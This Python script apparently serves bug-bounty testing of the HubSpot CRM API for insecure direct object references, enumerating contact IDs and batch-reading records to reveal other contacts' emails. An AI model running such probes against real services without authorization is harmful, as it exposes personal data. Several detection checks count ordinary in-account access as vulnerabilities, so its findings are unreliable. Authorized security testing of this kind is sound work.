#!/usr/bin/env python3
"""
HubSpot IDOR (Insecure Direct Object Reference) Testing Script
Author: BBHK Security Team
Date: August 20, 2025
Purpose: Test for IDOR vulnerabilities with existing Private App token
"""

import json
import requests
import random
import time
from datetime import datetime

# Configuration
BASE_URL = "https://api.hubapi.com"
TOKEN = "<YOUR_HUBSPOT_TOKEN>"
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

def test_cross_object_idor():
    """Test if object IDs can be used across different object types"""
    print("\n[*] Testing Cross-Object IDOR...")
    
    # First, get a valid contact ID
    response = requests.get(
        f"{BASE_URL}/crm/v3/objects/contacts?limit=1",
        headers=HEADERS
    )
    
    if response.status_code == 200 and response.json().get('results'):
        contact_id = response.json()['results'][0]['id']
        print(f"  [+] Got contact ID: {contact_id}")
        
        # Try to use contact ID as company ID
        print(f"  [>] Attempting to access contact {contact_id} as company...")
        response = requests.get(
            f"{BASE_URL}/crm/v3/objects/companies/{contact_id}",
            headers=HEADERS
        )
        
        if response.status_code == 200:
            print(f"  [✓] IDOR FOUND! Contact ID worked as company ID")
            return True
        elif response.status_code == 404:
            print(f"  [!] Properly validated - 404 returned")
        else:
            print(f"  [!] Status: {response.status_code}")
        
        # Try as deal ID
        print(f"  [>] Attempting to access contact {contact_id} as deal...")
        response = requests.get(
            f"{BASE_URL}/crm/v3/objects/deals/{contact_id}",
            headers=HEADERS
        )
        
        if response.status_code == 200:
            print(f"  [✓] IDOR FOUND! Contact ID worked as deal ID")
            return True
    
    return False

def test_incremental_id_access():
    """Test accessing objects with incremental IDs"""
    print("\n[*] Testing Incremental ID Access...")
    
    # Get our own contact first
    response = requests.get(
        f"{BASE_URL}/crm/v3/objects/contacts?limit=1",
        headers=HEADERS
    )
    
    if response.status_code == 200 and response.json().get('results'):
        base_id = int(response.json()['results'][0]['id'])
        print(f"  [+] Base contact ID: {base_id}")
        
        # Try adjacent IDs
        test_ids = [
            base_id - 1,
            base_id + 1,
            base_id - 100,
            base_id + 100,
            base_id - 1000,
            base_id + 1000
        ]
        
        found = []
        for test_id in test_ids:
            print(f"  [>] Testing contact ID: {test_id}")
            response = requests.get(
                f"{BASE_URL}/crm/v3/objects/contacts/{test_id}",
                headers=HEADERS
            )
            
            if response.status_code == 200:
                data = response.json()
                email = data.get('properties', {}).get('email', 'N/A')
                print(f"  [✓] Found contact {test_id}: {email}")
                found.append(test_id)
            elif response.status_code == 404:
                print(f"  [!] Not found")
            else:
                print(f"  [!] Status: {response.status_code}")
            
            time.sleep(0.5)  # Avoid rate limiting
        
        if found:
            print(f"\n  [✓] POTENTIAL IDOR: Found {len(found)} adjacent contacts")
            return True
    
    return False

def test_association_traversal():
    """Test if we can traverse associations to access unauthorized data"""
    print("\n[*] Testing Association Traversal...")
    
    # Get a contact with associations
    response = requests.get(
        f"{BASE_URL}/crm/v3/objects/contacts?limit=1&associations=companies,deals",
        headers=HEADERS
    )
    
    if response.status_code == 200 and response.json().get('results'):
        contact = response.json()['results'][0]
        contact_id = contact['id']
        print(f"  [+] Testing contact: {contact_id}")
        
        # Check for associated companies
        response = requests.get(
            f"{BASE_URL}/crm/v3/objects/contacts/{contact_id}/associations/companies",
            headers=HEADERS
        )
        
        if response.status_code == 200:
            associations = response.json().get('results', [])
            if associations:
                company_id = associations[0]['id']
                print(f"  [+] Found associated company: {company_id}")
                
                # Try to access company's other contacts
                response = requests.get(
                    f"{BASE_URL}/crm/v3/objects/companies/{company_id}/associations/contacts",
                    headers=HEADERS
                )
                
                if response.status_code == 200:
                    other_contacts = response.json().get('results', [])
                    if len(other_contacts) > 1:
                        print(f"  [✓] IDOR via association: Found {len(other_contacts)} contacts via company")
                        return True
    
    return False

def test_bulk_operations_idor():
    """Test if bulk operations allow access to unauthorized objects"""
    print("\n[*] Testing Bulk Operations IDOR...")
    
    # Create a mix of valid and potentially unauthorized IDs
    test_ids = [
        "412104641770",  # Our known contact
        "412104641771",  # Adjacent ID
        "412104641772",  # Adjacent ID
        "1",             # Low ID
        "999999999999"   # High ID
    ]
    
    payload = {
        "inputs": [{"id": id_val} for id_val in test_ids]
    }
    
    response = requests.post(
        f"{BASE_URL}/crm/v3/objects/contacts/batch/read",
        headers=HEADERS,
        json=payload
    )
    
    if response.status_code == 200:
        results = response.json().get('results', [])
        print(f"  [+] Bulk read returned {len(results)} results")
        
        for result in results:
            if result.get('id') not in ["412104641770"]:
                email = result.get('properties', {}).get('email', 'N/A')
                print(f"  [✓] IDOR: Accessed unauthorized contact {result['id']}: {email}")
                return True
    else:
        print(f"  [!] Bulk operation failed: {response.status_code}")
    
    return False

def test_property_history_idor():
    """Test if property history reveals unauthorized data"""
    print("\n[*] Testing Property History IDOR...")
    
    # Get a contact ID
    response = requests.get(
        f"{BASE_URL}/crm/v3/objects/contacts?limit=1",
        headers=HEADERS
    )
    
    if response.status_code == 200 and response.json().get('results'):
        contact_id = response.json()['results'][0]['id']
        
        # Try to get property history with propertiesWithHistory
        response = requests.get(
            f"{BASE_URL}/crm/v3/objects/contacts/{contact_id}?propertiesWithHistory=email,firstname,lastname",
            headers=HEADERS
        )
        
        if response.status_code == 200:
            data = response.json()
            if 'propertiesWithHistory' in data:
                history = data['propertiesWithHistory']
                print(f"  [✓] Got property history for contact {contact_id}")
                
                # Check if history contains data from other users
                for prop, hist in history.items():
                    if len(hist) > 1:
                        print(f"  [+] Found {len(hist)} history entries for {prop}")
                        return True
    
    return False

def test_search_api_idor():
    """Test if search API allows unauthorized filtering"""
    print("\n[*] Testing Search API IDOR...")
    
    # Try to search with various filters
    search_payload = {
        "filterGroups": [{
            "filters": [{
                "propertyName": "hs_object_id",
                "operator": "GT",
                "value": "0"
            }]
        }],
        "limit": 10
    }
    
    response = requests.post(
        f"{BASE_URL}/crm/v3/objects/contacts/search",
        headers=HEADERS,
        json=search_payload
    )
    
    if response.status_code == 200:
        results = response.json().get('results', [])
        if results:
            print(f"  [+] Search returned {len(results)} contacts")
            
            # Check if we got contacts we shouldn't have access to
            for contact in results:
                email = contact.get('properties', {}).get('email', 'N/A')
                created = contact.get('createdAt', 'N/A')
                print(f"    - {contact['id']}: {email} (created: {created})")
            
            if len(results) > 5:
                print(f"  [✓] Potential IDOR: Access to multiple contacts via search")
                return True
    
    return False

def main():
    """Main IDOR testing flow"""
    print("=" * 60)
    print("HubSpot IDOR Vulnerability Testing")
    print("=" * 60)
    print(f"Token: {TOKEN[:20]}...")
    
    vulnerabilities = []
    
    # Run all IDOR tests
    tests = [
        ("Cross-Object IDOR", test_cross_object_idor),
        ("Incremental ID Access", test_incremental_id_access),
        ("Association Traversal", test_association_traversal),
        ("Bulk Operations IDOR", test_bulk_operations_idor),
        ("Property History IDOR", test_property_history_idor),
        ("Search API IDOR", test_search_api_idor)
    ]
    
    for test_name, test_func in tests:
        try:
            if test_func():
                vulnerabilities.append(test_name)
                print(f"\n[✓✓✓] VULNERABILITY FOUND: {test_name}")
        except Exception as e:
            print(f"\n[!] Error in {test_name}: {str(e)}")
        
        time.sleep(2)  # Avoid rate limiting
    
    # Summary
    print("\n" + "=" * 60)
    print("IDOR TESTING SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().isoformat()}")
    print(f"Tests run: {len(tests)}")
    print(f"Vulnerabilities found: {len(vulnerabilities)}")
    
    if vulnerabilities:
        print("\n[✓] IDOR VULNERABILITIES DETECTED:")
        for vuln in vulnerabilities:
            print(f"  - {vuln}")
        print("\nExpected bounty: $1,000-$3,000")
    else:
        print("\n[!] No IDOR vulnerabilities found")
        print("Consider testing other areas or pivoting to new target")
    
    # Save results
    results = {
        "timestamp": datetime.now().isoformat(),
        "tests_run": [name for name, _ in tests],
        "vulnerabilities_found": vulnerabilities,
        "token_used": TOKEN[:20] + "..."
    }
    
    with open('idor_test_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[+] Results saved to idor_test_results.json")

if __name__ == "__main__":
    main()